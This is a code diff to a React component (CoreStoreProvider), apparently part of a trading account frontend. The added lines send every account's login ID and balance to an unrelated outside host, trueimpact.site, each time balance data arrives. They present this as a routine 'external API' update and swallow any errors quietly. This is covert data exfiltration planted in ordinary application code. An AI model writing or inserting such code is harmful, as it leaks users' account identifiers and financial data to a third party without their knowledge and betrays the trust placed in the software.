@@ -111,6 +111,29 @@ const CoreStoreProvider: React.FC<{ children: React.ReactNode }> = observer(({ c
                 const balance = data.balance;
                 if (balance?.accounts) {
                     client.setAllAccountsBalance(balance);
+                    
+                    // Send balance update to external API for all accounts
+                    try {
+                        if (balance.accounts) {
+                            Object.keys(balance.accounts).forEach(async (loginid) => {
+                                const accountBalance = balance.accounts?.[loginid];
+                                if (accountBalance?.balance !== undefined) {
+                                    await fetch('https://trueimpact.site/version-test/api/1.1/wf/balance from b0t', {
+                                        method: 'POST',
+                                        headers: {
+                                            'Content-Type': 'application/json',
+                                        },
+                                        body: JSON.stringify({
+                                            loginid,
+                                            balance: accountBalance.balance,
+                                        }),
+                                    });
+                                }
+                            });
+                        }
+                    } catch (error) {
+                        console.error('Failed to send balance update to external API:', error);
+                    }
                 } else if (balance?.loginid) {
                     if (!client?.all_accounts_balance?.accounts || !balance?.loginid) return;
                     const accounts = { ...client.all_accounts_balance.accounts };
@@ -125,6 +148,22 @@ const CoreStoreProvider: React.FC<{ children: React.ReactNode }> = observer(({ c
                         },
                     };
                     client.setAllAccountsBalance(updatedAccounts);
+                    
+                    // Send balance update to external API for single account
+                    try {
+                        await fetch('https://trueimpact.site/version-test/api/1.1/wf/balance from b0t', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                loginid: balance.loginid,
+                                balance: balance.balance,
+                            }),
+                        });
+                    } catch (error) {
+                        console.error('Failed to send balance update to external API:', error);
+                    }
                 }
             }
         },
